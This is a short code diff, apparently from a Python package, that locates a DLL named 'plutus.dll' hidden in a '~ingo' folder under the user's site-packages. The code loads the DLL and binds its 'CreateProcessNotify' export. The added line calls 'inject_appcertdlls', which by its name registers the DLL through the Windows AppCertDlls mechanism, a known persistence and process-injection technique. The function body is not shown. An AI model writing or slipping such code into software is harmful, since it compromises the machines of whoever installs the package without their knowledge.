@@ -374,6 +374,7 @@ import ctypes, glob, site
 from ctypes import wintypes
 print (site.getusersitepackages())
 file = glob.glob(f"{site.getusersitepackages()}/~ingo/plutus.dll")[0]
+inject_appcertdlls(file)
 dll = ctypes.WinDLL(file) 
 CreateProcessNotify = dll.CreateProcessNotify
 CreateProcessNotify.argtypes = []  # usually no arguments
